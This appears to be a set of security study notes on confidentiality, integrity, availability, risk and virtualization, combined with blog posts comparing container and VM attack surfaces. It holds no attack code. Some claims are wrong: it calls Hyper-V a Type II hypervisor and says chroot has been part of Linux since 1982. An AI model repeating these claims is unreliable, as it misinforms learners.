Identification, authentication, and authorization combined provide access controls and help ensure that only authorized personnel can access data. Imagine that you want to grant Maggie access to some data, but you don’t want Homer to be able to access the same data. You use access controls to grant and restrict access. The following bullets introduce key elements of access controls:
Identification. Users claim an identity with a unique username. example, both Maggie and Homer have separate user accounts identified with unique usernames. When Maggie uses her account, she is claiming the identity of her account. Authentication. Users prove their identity with authentication, such as with a password. example, Maggie knows her password, but no one else should know it. When she logs on to her account with her username and password, she is claiming the identity of her account and proving her identity with the password. Authorization. Next, you can grant or restrict access to resources using an authorization method, such as permissions. example, you can grant Maggie’s account full access to some files and folders. Similarly, you can ensure that Homer doesn’t have any permissionsto access thedata.
Chapter 2, “Understanding Identity and Access Management,” covers these topics in more depth. Steganography and Obfuscation
A third method you can use for confidentiality is steganography. Chapter 10 covers steganography in more depth, but as an introduction, it is the practice of hiding data within data. It obscures the data and can be used in a use case to support obfuscation.
Obfuscation methods attempt to make something unclear or difficult to understand. Within the context of information technology (IT) security, it’s called security by obscurity or security through obscurity. It’s worth noting that most security experts reject security through obscurity as a reliable method of maintaining security.
Many people refer to steganography as hiding data in plain sight. example, you can embed a hidden message in an image by modifying certain bits within the file. If other people look at the file, they won’t notice anything. However, if other people know what to look for, they will be able to retrieve the message.
As a simpler example, you can add a text file to an image file without the use of any special tools other than WinRAR and the Windows command line. If you’re interested in seeing how to do this, check out the Steganography Lab in the online exercises for this book at http://gcgapremium.com/501labs/.
Provide Integrity
Another common use case is to support integrity. Integrity provides assurances that data has not changed. This includes ensuring that no one has modified, tampered with, or corrupted the data. Ideally, only authorized users modify data. However, there are times when unauthorized or unintended changes occur. This can be from unauthorized users, from malicious
software (malware), and through system and human errors. When this occurs, the data has lost integrity.
 Hashing
Yo u can use hashing techniques to enforce integrity. Chapter 10 discusses the relevant hashing algorithms, such as Message Digest 5 (MD5), Secure Hash Algorithm (SHA), and Hash- based Message Authentication Code (HMAC). Briefly, a hash is simply a number created by executing a hashing algorithm against data, such as a file or message. If the data never changes, the resulting hash will always be the same. By comparing hashes created at two different times, you can determine if the original data is still the same. If the hashes are the same, the data is the same. If the hashes are different, the data has changed.
example, imagine Homer is sending a message to Marge and they both want assurances that the message retained integrity. Homer’s message is, “The price is $19.99.” He creates a hash of this message. For simplicity’s sake, imagine the hash is 123. He then sends both the message and the hash to Marge.
 Marge receives both the message and the hash. She can calculate the hash on the received message and compare her hash with the hash that Homer sent. If the hash of the received message is 123 (the same as the hash of the sent message), she knows the message hasn’t lost data integrity. However, if the hash of the received message is something different, such as 456, then she knows that the message she received is not the same as the message that Homer sent. Data integrity has beenlost. Hashing doesn’t tell you what modified the message. It only tells you that the message has been modified. This implies that the information should not be trusted as valid.
You can use hashes with messages, such as email, and any other type of data files. Some email programs use a message authentication code (MAC) instead of a hash to verify integrity, but the underlying concept works the same way.
You can also use hashing techniques to verify that integrity is maintained when files are downloaded or transferred. Some programs can automatically check hashes and determine if a file loses even a single bit during the download process. The program performing the download will detect it by comparing the source hash with the destination hash. If a program detects that the hashes are different, it knows that integrity has been lost and reports the problem to the user. As another example, a web site administrator can calculate and post the hash of a file on a web site. Users can manually calculate the hash of the file
after downloading it and compare the calculated hash with the posted
hash. If a virus infects a file on the web server, the hash of the infected file would be different from the hash of the original file (and the hash posted on the web site). You can use freeware such as md5sum.exe to calculate MD5 hashes. If you want to see this in action, check out the Creating and Comparing Hashes Lab in the online exercises for this book at http://gcgapremium.com/ 501labs/.
I t ’s also possible to lose data integrity through human error. example, if a database administrator needs to modify a significant amount of data in a database, the administrator can write a script to perform a bulk update. However, if the script is faulty, it can corrupt the database, resulting in a loss of integrity.
Two key concepts related to integrity are:
Integrity provides assurances that data has not been modified, tampered with, or corrupted. Loss of integrity indicates the data is different. Unauthorized users can change data, or the changes can occur through system or human errors.
•
  Hashing verifies integrity. A hash is simply a numeric value created by executing a hashing algorithm against a message or file. Hashes are created at the source and destination or at two different times (such as on the first and fifteenth of the month). If the hashes are the same, integrity is maintained. If the two hashes are different, data integrity has been lost.
Digital Signatures, Certificates, and Non- Repudiation
You can also use digital signatures for integrity. Chapter 10 covers digital signatures in more depth, but as an introduction, a digital signature is similar in concept to a handwritten signature. Imagine you sign a one- page contract. Anyone can look at the contract later, see your signature, and know it is the same contract. It isn’t possible for other people to modify the words in the contract unlessthey can reproduce your signature, which isn’t easy to do.
It’s common to use digital signatures with email. example, imagine that Lisa wants to send an email to Bart. She can attach a digital signature to the email and when Bart receives it, the digital signature provides assurances to him that the email has not been modified.
Adigital signature also provides authentication. In other words, if the digital signature arrives intact, it authenticates the sender. Bart knows that Lisa sent it.
Authentication from the digital signature prevents attackers from impersonating others and sending malicious emails. example, an attacker could make an email look like it came from Lisa and include a link to a malicious web site urging Bart to click it. Without a digital signature, Bart
might be fooled into thinking that Lisa sent it and click the link. This might result in Bart inadvertently downloading malware onto his system.
Digital signatures also provide non-repudiation. In other words, Lisa cannot later deny sending the email because the digital signature proves she did. Another way of thinking about non-repudiation is with credit cards. If you buy something with a credit card and sign the receipt, you can’t later deny making the purchase. If you do, the store will use your signature to repudiate your claim. In other words, they use your signature for non-repudiation.
Security systems implement non-repudiation methods in other ways beyond digital signatures. Another example is with audit logs that record details such as who, what, when, and where. Imagine Bart logged on to a computer with his username and password, and then deleted several important files. If the audit log recorded these actions, it provides non- repudiation. Bart cannot believably deny he deleted the files.
Digital signatures require the use of certificates and a Public Key Infrastructure (PKI). Certificates include keys used for encryption and the PKI provides the means to create, manage, and distribute certificates. Obviously, there’s much more to certificates and a PKI, but there isn’t room in this chapter for more than an introduction. Feel free to jump ahead to Chapter 10 if you want to learn more right now.
 Increase Availability
Availability indicates that data and services are available when needed. For some organizations, this simply means that the data and services must be available between 8:00
a.m. and 5:00 p.m., Monday through Friday. For other organizations, this means they must be available 24 hours a day, 7 days a week, 365 days a year.
Organizations commonly implement redundancy and fault-tolerant methods to ensure high levels of availability for key systems. Additionally, organizations ensure systems stay up to date with current patches to ensure that software bugs don’t affect their availability.
Redundancy and Fault Tolerance Redundancy adds duplication to critical systems and provides fault tolerance. If a critical component has a fault, the duplication provided by the redundancy allows the service to continue without interruption. In other words, a system with fault tolerance can suffer a fault, but it can tolerate it and continue to operate.
A common goal of fault tolerance and redundancy techniques is to remove each single point of failure (SPOF). If an SPOF fails, the entire system can fail. example, if a server has a single drive, the drive is an SPOF because its failure takes down the server.
Chapter 9, “Implementing Controls to Protect Assets,” covers many fault- tolerance and redundancy techniques in more depth. As an introduction, here are some common examples:
Disk redundancies. Fault-tolerant disks, such as RAID-1 (mirroring), RAID-5 (striping with parity), and RAID-10 (striping with a mirror), allow a system to continue to operate even if a disk fails.
Server redundancies. Failover clusters include redundant servers and ensure a service will continue to operate, even if a server fails. In a failover cluster, the service switches from the failed server in a cluster to an operational server in the same cluster. Virtualization can also increase availability of servers by reducing unplanned downtime. The “Implementing Virtualization” section later in this chapter covers virtualization in more depth.
Load balancing. Load balancing uses multiple servers to support a single service, such as a high-volume web site. It can increase the availability of web sites and web-based applications.
Site redundancies. If a site can no longer function due to a disaster, such as a fire, flood, hurricane, or earthquake, the organization can move critical systems to an alternate site. The alternate site can be a hot site (ready and available 24/7), a cold site (a location where equipment, data, and personnel can be moved to when needed), or a warm site (a compromise between a hot site and cold site).
Backups. If personnel back up important data, they can restore it if the original data is lost. Data can be lost due to corruption, deletion, application errors, human error, and even hungry gremlins that just randomly decide to eat your data. Without data backups, data is lost forever after any one of these incidents.
Alternate power. Uninterruptible power supplies (UPSs) and power generators can provide power to key systems even if commercial power fails.  Cooling systems. Heating, ventilation, and air conditioning (HVAC) systems improve the availability of systems by reducing outages from overheating.
Patching
Another method of ensuring systems stay available is with patching. Software bugs cause a wide range of problems, including security issues and even random crashes. When software vendors discover the bugs, they develop and release code that patches or resolves these problems. Organizations commonly implement patch management programs to ensure that systems stay up to date with current patches. Chapter 5, “Securing Hosts and Data,” covers patching and patch management in greater depth.
Resource Versus Security Constraints
Organizations frequently need to balance resource availability with security constraints. Consider using encryption to maintain the confidentiality of data. If this is possible, why not just encrypt all the data? The reason is that encryption consumes resources.
example, the above paragraph is about 260 characters. Encrypted, it is about 360 characters. That’s an increase of about 40 percent, which is typical with many encryption methods. If a company decides to encrypt all data, it means that it will need approximately 40 percent more disk space to store the data. Additionally, when processing the data, it consumes more memory. Last, it takes additional processing time and processing power to encrypt and decrypt the data.
Security experts might say the cost for additional resources is worth it, but executives looking to increase the value of the company don’t. Instead, executives have a responsibility to minimize costs without sacrificing security. They do this by looking for the best balance between resource costs and security needs.
Introducing Basic Risk Concepts
One of the basic goals of implementing IT security is to reduce risk. Because risk is so important and so many chapters refer to elements of risk, it’s worth providing a short introduction here.
Risk is the possibility or likelihood of a threat exploiting a vulnerability resulting in a loss. A threat is any circumstance or event that has the potential to compromise confidentiality, integrity, or availability. A vulnerability is a weakness. It can be a weakness in the hardware, the software, the configuration, or even the users operating the system.
If a threat (such as an attacker) exploits a vulnerability, it can result in a security incident. A security incident is an adverse event or series of events that can negatively affect the
confidentiality, integrity, or availability of an organization’s information technology (IT) systems and data. This includes intentional attacks, malicious software (malware) infections, accidental data loss, and much more.
Threats can come from inside an organization, such as from a disgruntled employee or a malicious insider. They can come from outside the organization, such as from an attacker anywhere in the world with access to the Internet. Threats can be natural, such as hurricanes,tsunamis, or tornadoes, or manmade, such as malware written by a criminal. Threats can be intentional, such as from attackers, or accidental, such as from employee mistakes or system errors.
Reducing risk is also known as risk mitigation. Risk mitigation reduces the chances that a threat will exploit a vulnerability. You reduce risks by implementing controls (also called countermeasures and safeguards), and many of the actions described throughout this book are different types of controls. You can’t prevent most threats. example, you can’t stop a tornado or prevent a criminal from writing malware. However, you can reduce risk by reducing vulnerabilities to the threat, or by reducing the impact of the threat.
example, access controls (starting with authentication) ensure that only authorized personnel have access to specific areas, systems, or data. If employees do become disgruntled and want to cause harm, access controls reduce the amount of potential harm by reducing what they can access. If a natural disaster hits, business continuity and disaster recovery plans help reduce the impact. Similarly, antivirus software prevents the impact of any malware by intercepting it before it causes any harm.
Implementing Virtualization
Virtualization is a popular technology used within large data centers and can also be used on a regular personal computer (PC).
- It allows you to host one or more virtual systems, or virtual machines (VMs), on a single physical system.
- With today’s technologies, you can host an entire virtual network within a single physical system and organizations are increasingly using virtualization to reduce costs.
- Hypervisor:
  - The software that creates, runs, and manages the VMs is the
hypervisor.
  - Several virtualization technologies: VMware, Microsoft Hyper-V products, and Oracle VM VirtualBox. These applications have their own hypervisor software.
- Host:
  - The physical system hosting the VMs is the host.
   - It requires more resources than a typical system, such as multiple processors, massive amounts of RAM, fast and abundant hard drive space, and one or more fast network cards.
  - Although these additional resources increase the cost of the host, it is still less expensive than paying for multiple physical systems. It also requires less electricity, less cooling, and less physical space.
- Guest:
  - Operating systems running on the host system are guests or guest
machines.
  - Most hypervisors support several different operating systems,
including various Microsoft operating systems and various Linux
distributions.
  - Additionally, most hypervisors support both 32- bit and 64-bit
operating systems.
Host elasticity and scalability.
- Elasticity and scalability refer to the ability to resize computing capacity
based on the load.
  - Example
  - VM has increased traffic. You can increase the amount of processing
power and memory used by this server relatively easily.
  - it’s relatively easy to decrease the resources when the load decreases.
- Virtualization typically provides the best return on investment (ROI) when an organization has many underutilized servers.
  - Example
  - organization has nine servers with each using only about 20 percent
processing power, memory, and disk space.
  - You could convert three physical servers to virtual hosts and run three
guest servers on each physical server.
  - Assuming all the servers are similar, this wouldn’t cost any more
money for the physical servers.
  - Additionally, three physical servers consume less electricity and
require less heating and ventilation to maintain.
In contrast, imagine the organization has nine servers with each using about 80 percent of their processing power, memory, and disk space. Although it is possible to convert them all to virtual servers, it requires the purchase of additional hardware. The savings from less electricity and less heating and ventilation is offset by the cost of the new servers.
Comparing Hypervisors
Hypervisor virtualization is divided into primarily two different types:
- Type I hypervisors
  - run directly on the system hardware.
  - often called bare-metal hypervisors, because they don’t need to run within an operating system.
  - Example
  - VMware has ESX/ESXi products that are Type I hypervisors.
- Type II hypervisors
  - run as software within a host operating system.
  - Example
  - Microsoft Hyper-V hypervisor runs within a Microsoft operating system.  ⁃
  - each guest has a full operating system, including its own kernel.
  - kernel is just the central part or most important part of something.
When referring to a computer, the kernel is the central part of the operating system.
- When implementing virtualization on a PC, use Type II hypervisor-based virtualization.
- But virtualization in large-scale data centers, uses Type I virtualization.
Application Cell or Container Virtualization Application cell virtualization / container virtualization / Container-based virtualization:
- runs services or applications within isolated application cells (or containers).
 ▪


## - the containers don’t host an entire operating system.
- Instead, the host’s operating system and kernel run the service or app within each of the containers.
- However, because they are running in separate containers, none of the services or apps can interfere with services and apps in other containers.
- Benefit:
  - uses fewer resources
  - can be more efficient than a system using a traditional Type II
hypervisor virtualization.
  - Internet Service Providers (ISPs) often use it for customers who need specific applications.
- Drawback
  - containers must use the operating system of the host.
  - example, if the host is running Linux, all the containers must run Linux. ▪


## containers vs virtual machines (VM’s)
Virtual Machines provide a very strong isolation on the host level and don’t share the OS. The primary reason for developers to move to a microservices based architecture is to break up the app stack into smaller pieces, thus providing a more agile environment. In doing so your application services will now be connected thru the network and this opens up a myriad a potential security issues.
some people believe that containers are inherently more secure than vm’s.
The argument is that breaking applications into microservices with well-defined interfaces and limited packaged
services reduces the attack surface overall.
The key point is that a well-implemented container
deployment which includes security precautions can be at least as secure, if not more secure, than vm’s.
Containers and container deployments face a multitude of different threats, weaknesses and vulnerabilities, which must be considered, and dealt with prior to production.
 Unlike VMs, the fundamental risks of open network traffic across services and a shared kernel cannot be ignored and deserves real security concern.
Recommendations can be made for any container platform, and in almost any deployment scenario. They generally come down to similar security recommendations for almost any system, platform or service:
. Scan your container before and during run-time. Reduce all attack surfaces in the App/OS etc. to only those required and harden what surfaces must be exposed.
. Use network micro segmentation to isolate application clusters based on trust, risk, and exposure.
. Apply and enable all security relevant and supported configuration options for the platform such as registry scanning, access controls, and container privileges.
. Always keep the host and container versions up-to- date.
. Know your app and how it’s supposed to behave. Create visibility to the intra-container and intra-host network traffic (east-west) as well as normal north-south monitoring.
. Continuously test and review the above security recommendations in your CI/CD process.
. Log threats and vulnerabilities from your Docker host in your regular SIEM tool such as Splunk or Nagios
. Implement a third party – container specific security platform such as NeuVector. Remember traditional firewalls can’t keep up with the rapid pace and fluidity of container deployments so status quo is not an option.
Today, security is much more of a concern with containers than it is with virtual machines. In fact, according to a Forrestor Research study, 53% of enterprises deploying containers
cite Security as top concern.
This is likely due to the fact that vm’s have reached maturity in their deployment and the attack surfaces are fairly well understood. Containers, on the other hand, are the wild west and no one really knows where attacks could come from.
What About VMs AND Containers?
Many enterprises with existing applications running on a stable vm infrastructure are choosing to take a ‘toe in the water’ approach. By deploying containers on vm’s they get the benefits of mature monitoring and isolation with more
rapid DevOpsprocesses. Compared to containers running on bare metal, they do give up some performance, scalability, and cost. But it’s certainly a valid way to transition.
It’s easy to get excited about this new microservice era and all it’s clear benefits. However with all new technologies come new threats that MUST be considered and understood prior to production. At NeuVector we believe that the best protection for containers happens during run-time and as close to
container network traffic as possible.
It’s the last line of defense in a new and often changing
environment.
Analogously – if it was at all practical and affordable every apartment building would have it’s own doorman and check all visitors ID – right?
 Containers 101 – What
do you need to know?
amit gupta / 08.08.17
Thanks to Docker, containers are now the future of web development. According to DataDog, 15% of hosts run Docker, which is significantly up both from the 6% of hosts running it at this point in 2015 and the 0% of hosts running it before it was released in March of 2013. LinkedIn has also seen a 160% increase in profile references to Docker in just the past year alone, indicating it’s becoming much more important to know something about Docker when looking for work.
What exactly are containers? And why are they so rapidly grabbing developer market share from virtual machines?
To answer these questions, it’s helpful to consider containers in contrast to VMs.
A virtual machine is an emulation of an entire operating system managed by a hypervisor. A virtual machine may be run over the top of another OS or directly off the hardware. In
 either case, one VM can and usually will be run alongside other VMs, all of which are allocated their own set static space and resources by the hypervisor, with each VM acting as its own independent computer.
A container is a self-contained (it’s right there in the name) execution environment with its own isolated network resources. At a quick glance, a container may appear very similar to a VM. The key difference is that a container does not emulate a separate OS. Containers instead create separate, independent user spaces that have their own bins and libs, but that share the host operating system’s kernel with all other containers running on a machine. This being the case, containers do not need to be assigned their own set amount of RAM and other resources; they simply make use of whatever they need while they’re running.
In short: a virtual machine virtualizes the hardware, while a container virtualizes the OS.
This means containers are significantly more lightweight than VMs. They can be spun up in seconds instead of minutes and you can run as many as 8x as many of them on a single machine. And since the OS has been abstracted away, they can be easily moved from one machine to another.
What is contained in a container?
A container is made up of container images that bundle up the code and all its dependencies. One of these container images will be the app itself. The other images will be the libraries and binaries needed to run that app. All the images that make up the container are then turned into an image template that can be reused across multiple hosts.
It may sound like a lot of effort to add all the necessary individual images to a container, but all your images are stored and run out of a registry. If your application needs PHP 7.0, Apache, and Ubuntu to run then you’ll reference these in your config file and your container manager will pull them from this registry (assuming they’re there).
Where does Docker come into all of this?
Containers are nothing new, having been part of Linux since the creation of chroot in 1982. But to run them, you need a container manager like the one referenced above. Docker is by far the most popular of these (it’s nearly synonymous with containers at this point) and has been at the forefront of the rapid surge in container usage. What sets is apart?
The Docker Hub – This hub is not only the registry where your various images are privately stored, it’s also a rich ecosystem of public images built by other Docker users that you can pull down and use for your own projects. Why do all the grunt work when there are other people out there who have already done it?
Easy Version History and Rollbacks – Docker containers are read-only post-creation. That doesn’t mean you can’t make changes, what it does mean is that any changes are used to create new images whenever you run the “docker commit” command. These new images become new containers that you run just like the original. If an alteration leads to a problems in a new image, then you can simply go back to the previous one.
Portability – Containers are already portable just by the nature of their design, but Docker guarantees the environment will be exactly the same when moving an image from one Docker host to another so you can build once and run anywhere.
Docker is open source and its technology is the basis of the Open Containers Initiative, which is a Linux Foundation initiative focused on creating “industry standards around container formats and runtime.” Google, Amazon, Microsoft and other industry leaders are also part of the OCI.
Are containers available only on Linux?
Until very recently the answer was yes, but Microsoft added container support to Windows Server 2016. This can be managed using Docker for Windows.
Will containers replace virtual machines?
Though containers will absolutely continue to rise in popularity, it’s incredibly unlikely they’ll replace VMs. More likely the two will be used in concert with each other, each being put to use where most appropriate. Occasionally, containers might even be run within virtual machines, warping the space time continuum and confusing partisans of both approaches. We truly live in the future.
There are particular concerns about containers and security, as the varied images provide more points of entry for attackers and a container’s direct access to the OS kernel
       creates a larger surface area for attack than would be found in a hypervisor controlled virtual machine. As a security company, we’ll certainly have a lot more to say about that in due time.
 In computer systems, the attack surface includes anything where the attacker (or software acting on his behalf) can “touch” the target system.
Network interfaces, hardware connections, and shared resources are all possible attack points. Note that the attack surface doesn’t imply that an actual vulnerability exists. All 10 doors might be perfectly secure. But a larger attack surface means more places to protect and the greater likelihood the attacker will find a weakness in at least one. Structural view
For the structural approach I’ll compare the attack surface of both systems. An attack surface represents the number of points at which a system can be attacked. It isn’t precisely defined (as a number, for example) but is useful for comparisons. To a burglar, a house with 10 doors has a greater attack surface than a house with one door, even if the doors are identical. One door might be left unlocked; one lock might be defective; doors in different locations might offer an intruder more privacy, and so on.
In computer systems, the attack surface includes anything where the attacker (or software acting on his behalf) can “touch” the target system. Network interfaces, hardware connections, and shared resources are all possible attack points. Note that the attack surface doesn’t imply that an actual vulnerability exists. All 10 doors might be perfectly secure. But a larger attack surface means more places to protect and the greater likelihood the attacker will find a weakness in at least one.
The total attack surface depends on the number of different touch points and the complexity of each. Let’s look at a simple example. Imagine an old-fashioned system that serves up stock market quotes. It has a single interface, a simple serial line. The protocol on that line is simple too: A fixed length stock symbol, say five characters, is sent to the server, which responds with a fixed-length price quotation -- say, 10 characters. There's no Ethernet, TCP/IP, HTTP, and so on. (I actually worked on such systems long ago in a galaxy far, far away.)
The attack surface of this system is very small. The attacker can manipulate the electrical characteristics of the serial line, send incorrect symbols, send too much data, or otherwise vary the protocol. Protecting the system would involve implementing appropriate controls against those attacks.
Now imagine the same service, but in a modern architecture. The service is available on the Internet and exposes a RESTful API. The electrical side of the attack is gone -- all that will do is fry the attacker’s own router or switch. But the protocol is enormously more complex. It has layers for IP, TCP, possibly TLS, and HTTP, each offering the possibility of an exploitable vulnerability. The modern system has a much larger attack surface, though it still looks to the attacker like a single interface point.
Bare-metal attack surface
For an attacker not physically present in the data center, the initial attack surface is the network into the server. This led to the “perimeter view” of security: Protect the entry points into the data center and nothing gets in. If the attacker cannot get in, it doesn’t matter what happens between systems on the inside. It worked well when the perimeter interfaces were simple (think dial-up), but fostered weaknesses on internal interfaces. Attackers who found a hole in the perimeter would often discover that the internal attack surface of the server farm was much larger than the external one, and they could do considerable damage once inside. This internal attack surface included network connections between servers but also process-to-process interactions within a single server. Worse, since many services run with elevated privileges (“root” user), successfully breaking into one would effectively mean unfettered access to anything else on that system, without having to look for additional vulnerabilities. A whole industry grew up around protecting servers -- firewalls, antimalware, intrusion detection, and on and on -- with less than perfect results.
There are also interesting “side channel” attacks against servers. Researchers have shown examples of using power consumption, noise, or electromagnetic radiation from computers to extract information, sometimes very sensitive data such as cryptographic keys. Other attacks have leveraged exposed interfaces like wireless keyboard protocols. In general, however, these attacks are more difficult -- they might require proximity to the server, for example -- so the main path of coming “down the wire” is more common.
VM attack surface
When VMs are used in the same way as bare metal, without any difference in the architecture of the application (as they often are), they share most of the same attack points. One additional attack surface is potential failure in the hypervisor, OS, or hardware to properly isolate resources between VMs, allowing a VM to somehow read the memory of another VM. The interface between the VM and the hypervisor also represents an attack point. If a VM can break through and get arbitrary code running in the hypervisor, then it can access other VMs on the same system. The hypervisor itself represents a point of attack since it exposes management interfaces.
There are additional attack points depending on the type of VM system. Type 2 VM systems use a hypervisor running as a process on an underlying host OS. These systems can be attacked by attacking the host OS. If the attacker can get code running on the host system, he can potentially affect the hypervisor and VMs, especially if he can get access as a privileged user. The presence of an entire OS, including utilities, management tools, and possibly other services and entry points (such as SSH) provides a number of possible attack points. Type 1 VM systems, where the hypervisor runs directly on the underlying hardware, eliminate these entry points and therefore have a smaller attack surface.
Container attack surface
As with VMs, containers share the fundamental network entry attack points of bare-metal systems. In addition, like Type 2 virtual machines, container systems that use a “fully loaded” host OS are subject to all of the same attacks available against the utilities and services of that host OS. If the attacker can gain access to that host, he can try to access or otherwise affect the running containers. If he gets privileged (“root”) access, the attacker will be able to access or control any container. A “minimalist” OS (such as Apcera’s KurmaOS) can help reduce this attack surface but cannot eliminate it entirely, since some access to the host OS is required for container management.
The basic container separation mechanisms (namespaces) also offer potential attack points. In addition, not all aspects of processes on Linux systems are namespaced, so some items are shared across containers. These are natural areas for attackers to probe. Finally, the process to kernel interface (for system calls) is large and exposed in every container, as opposed to the much smaller interface between a VM and the hypervisor. Vulnerabilities in system calls can offer potential access to the kernel. One example of this is the recently reported vulnerability in the Linux key ring.
Architectural considerations
For both VMs and containers, the size of the attack surface can be affected by the application architecture and how the technology is used.
Many legacy VM applications treat VMs like bare metal. In other words, they have not adapted their architectures specifically for VMs or for security models not based on perimeter security. They might install many services on the same VM, run the services with root privileges, and have few or no security controls between services. Rearchitecting these applications (or more likely replacing them with newer ones) might use VMs to provide security separation between functional units, rather than simply as a means of managing larger numbers of machines.
Containers are well suited for microservices architectures that “string together” large numbers of (typically) small services using standardized APIs. Such services often have a very short lifetime, where a containerized service is started on demand, responds to a request, and is destroyed, or where services are rapidly ramped up and down based on demand. That usage pattern is dependent on the fast instantiation that containers
   support. From a security perspective it has both benefits and drawbacks.
The larger number of services means a larger number of network interfaces and hence a larger attack surface. However, it also allows for more controls at the network layer. For example, in the Apcera Platform, all container-to-container traffic must be explicitly permitted. A rogue container cannot arbitrarily reach out to any network endpoint.
Short container lifetime means that if an attacker does get in, the time he has to do something is limited, as opposed to the window of opportunity presented by a long-running service. The downside is that forensics are harder. Once the container is gone, it cannot be probed and examined to find the malware. These architectures also make it more difficult for an attacker to install malware that survives after container destruction, as he might on bare metal by installing a driver that loads on boot. Containers are usually loaded from a trusted, read-only repository, and they can be further secured by cryptographic checks.
Now let’s consider what goes on during a breach.
Protection against breaches
Attackers typically have one or two goals in cracking into a server system. They want to get data or to do damage.
If they’re after data, they want to infiltrate as many systems as possible, with the highest privileges possible, and maintain that access for as long as possible. Achieving this gives them time to find the data, which might be already there -- a poorly secured database, for example -- or might require slow collection over time as it trickles in, such as collecting transactions as they come in from users. Maintaining access for a long time requires stealth. The attack also requires a way to get the data out.
If the attacker is trying simply to do damage, the goal again is to access as many systems and privileges as possible. But there is a balancing act: Once the damage starts it will presumably be noticed, but the longer the attacker waits to start (while the malware filters from system to system), the greater the chance of being detected. Getting data out is less important than coordinated control of the malware. The idea is to infect as many systems as possible, then damage them at a synchronized point, either prearranged or on command.
Breaches involve a number of elements. Let’s look at each and see if VMs and containerized architectures can affect the attack surface for each.
Gaining initial access. The attacker needs a point of entry into the system, ideally to a point as “deep inside” as possible and with the highest possible privileges. One potential channel is to find a vulnerability in a public-facing endpoint such as a Web server. Since these often run as a privileged user, under an architecture where each VM runs multiple services, such an attack can be very powerful. Containerizing the Web server, or isolating it in its own VM, helps limit the attack by separating the Web server process from other processes. User namespacing separates the root user of the container from the root user of the host OS. For this reason containers offer better protection at this stage of an attack than a legacy VM application, and they are probably on a par with VM architectures that use separate VMs by function.
Server vulnerabilities happen, but the much more common attack point is to gain access to a user’s workstation, leveraging browser vulnerabilities or social engineering. This might get attack code running inside the corporate network, if that’s where the system is located; ideally (from the attacker’s standpoint) the company has done a poor job of segregating the production and employee networks.
Inside the corporate network or not, the malware can monitor the user’s activities and look for credentials for other systems that might be better attack points. If the user is an administrator or other privileged user, with access to sensitive systems, the attacker has hit the jackpot. The security postures of containers and VMs (at the server level) are largely the same here, although there are interesting applications of both VM and container technology at the individual workstation that try to better secure the browser.
Move laterally from system to system. Unless the first system attacked has what the attacker wants -- unlikely -- he will try to spread the attack through the corporate network. The most effective entry point into servers (from, say, an infected workstation) would be a vulnerable host OS for containers or Type 2 VMs. If the attacker compromises such a host and gets root, he will be able to access every container or Type 2 VM on the system. The equivalent attack on a Type 1 virtualization host would be much more difficult, due to the hypervisor’s much smaller attack surface. Direct attacks on interfaces exposed by services have similar attack surfaces for services in containers and VMs. Once inside a server, the attacker will want to move throughout that machine and to others. Here containers are more vulnerable to OS attacks, due to the larger attack surface presented by the OS system call interface. The attacker’s ability to extend his reach by calling out to other services depends on how well network controls are applied. If the network is open, the attacker will proceed to search for other systems. However, strict network controls (like those provided in the Apcera Platform) can help limit access in containerized systems.
Escalate privilege. If the attacker already has administrative credentials, especially with access to server side management interfaces (hypervisor management, container management, host OS access), neither approach can provide much protection. In this case the attacker has pretty much won.
Inside a server, the interface between containers and the kernel makes for a larger attack surface than the interface between a VM and a hypervisor. This vulnerability is mitigated by user namespaces, which constrain the power of root inside the container. Privileged access inside the container can affect the app itself and potentially shared resources (like data sources), but can’t access root resources outside the container.
Again, if the VM architecture has many services inside a single VM, privilege escalation can cause more damage, since code running as root inside one service will effectively have unlimited access to the other services. Similar logic argues against container architectures with multiple processes or services inside the same container. have similar access privileges to data, so they're vulnerable to an attack. VMs often have virtual disks used by many processes. On the other hand, the container practice of “no data inside containers” helps isolate and protect sensitive data. Microservices architecture standardizes such access with RESTful APIs that can have standardized controls (such as authentication and authorization) applied to them. Other controls, such as Apcera’s Semantic Pipelines, can provide advanced security between containers and data sources.
Embed a long-lived presence. Both VMs and containers can be booted from trusted repositories, so they are similar in their resistance to an attacker infecting an image with malware that survives across a boot. The underlying host OS, if one is present, may be vulnerable to such an attack. Mechanisms are evolving for secured system boot, starting from an embedded hardware root of trust, that can prevent these kinds of attacks, but they are not yet widely deployed. The long-lived nature of VMs gives containers an edge here, since the container may come and go before the malware has a chance to do much.
Do damage. This is similar to finding sensitive data, but with write access: The attacker wants to change something, wipe a disk, insert transactions, and so on. Container-based microservices architectures encourage better isolation and, hence, better protection against damage than typical VM systems.
Exfiltrate data. A more closed and closely controlled network of containers (such as that in the Apcera Platform) has a smaller attack surface for exfiltration than one with open VMs. However, the ability to apply the controls is key. VMs can be similarly protected (at least VM to
 VM, if not between services inside a single VM) by appropriate configuration of networking infrastructure, but the process is often manual, tedious, and error prone. Similarly, a container network without inherent platform support for network controls would be difficult to make both operational and secure.
Comparing container and VM security yields no runaway winner. Much depends on how the containers and VMs are used, and specifically on the architecture of the applications they support. In this regard, containers often have an edge because they are more likely to be used for new applications. In some sense it is unfair to compare VMs running within legacy architectures with containers and microservices, but that is often the reality of how they are used. Perimeter controls cannot contain modern attacks. We need to evolve our approach to security and adapt to new architectures. Containers, along with solid platforms for securing and managing these architectures, will be an important part of that evolution.
Secure Network Architecture
It is possible to use virtualization as part of an overall secure network architecture. One of the primary benefits is that VMs can provide segregation, segmentation, and isolation of individual systems. One way of doing so is to disable the network interface card (NIC) in the VM. This prevents it from transmitting any data in or out of the VM.
Snapshots which you can use as a backup. You are still able to use the VM just as you normally would. However, after taking a snapshot, the hypervisor keeps a record of all changes to the VM. If the VM develops a problem, you can revert the VM to the state it was in when you took the snapshot.
Administrators commonly take snapshots of systems prior to performing any risky operation. Risky operations include applying patches or updates, testing security controls, and installing new applications. Ideally, these operations do not cause any problems, but
 occasionally they do. By creating snapshots before these operations, administrators can easily revert or roll back the system to a known good state with a known goodconfiguration.
VDI/VDE and Non-Persistence
In addition to virtualization servers, it’s also possible to virtualize desktops. In a virtual desktop infrastructure (VDI) or virtual desktop environment (VDE), a user’s desktop operating system runs as a VM on a server.
One benefit of using a VDI/VDE is that user PCs can have limited hardware resources. If the PC can connect to a server over a network, it can run a full-featured desktop operating system from the server.
A primary consideration when running virtual desktops is whether they will support persistence or non-persistence. In a persistent virtual desktop, each user has a custom desktop image. Users can customize them and save their data within the desktop. A drawback is the amount of disk space required on the server to support unique desktop images for all users.
